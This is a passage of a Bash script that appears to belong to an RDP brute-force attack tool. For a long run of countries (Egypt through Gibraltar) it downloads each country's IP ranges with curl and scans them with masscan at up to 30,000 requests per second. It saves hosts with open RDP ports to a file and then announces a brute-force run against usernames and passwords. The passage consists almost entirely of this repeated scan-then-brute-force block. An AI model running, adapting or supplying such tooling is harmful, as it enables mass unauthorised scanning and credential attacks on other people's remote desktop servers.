echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "54" ]; then
curl http://services.ce3c.be/ciprg/?countrys=EGYPT |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Egypt://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "55" ]; then
curl http://services.ce3c.be/ciprg/?countrys=EL+SALVADOR |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/El Salvador://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "56" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ERITREA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Eritrea://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "57" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ESTONIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Estonia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "58" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ETHIOPIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Ethiopia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "59" ]; then
curl http://services.ce3c.be/ciprg/?countrys=EUROPEAN+UNION |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/European Union://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "60" ]; then
curl http://services.ce3c.be/ciprg/?countrys=FAROE+ISLANDS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Faroe Islands://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "61" ]; then
curl http://services.ce3c.be/ciprg/?countrys=FIJI |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Fiji://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "62" ]; then
curl http://services.ce3c.be/ciprg/?countrys=FINLAND |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Finland://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "63" ]; then
curl http://services.ce3c.be/ciprg/?countrys=FRANCE |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/France://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "64" ]; then
curl http://services.ce3c.be/ciprg/?countrys=FRENCH+GUIANA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/French Guiana://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "65" ]; then
curl http://services.ce3c.be/ciprg/?countrys=FRENCH+POLYNESIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/French Polynesia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "66" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GABON |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Gabon://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "67" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GAMBIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Gambia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "68" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GEORGIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Georgia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "69" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GERMANY |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Germany://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "70" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GHANA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Ghana://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "71" ]; then
curl http://services.ce3c.be/ciprg/?countrys=GIBRALTAR |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Gibraltar://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
